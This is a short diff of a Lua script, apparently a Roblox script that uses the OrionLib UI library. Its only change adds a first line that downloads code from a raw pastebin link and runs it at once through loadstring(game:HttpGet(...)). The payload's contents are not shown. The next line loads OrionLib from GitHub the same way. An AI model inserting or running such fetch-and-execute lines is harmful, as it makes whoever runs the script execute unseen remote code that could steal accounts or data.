@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/6xQ5gtbj"))();
 -- 保留的 OrionLib 框架结构
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/wsomoQaz/lua-/main/vc"))()
 
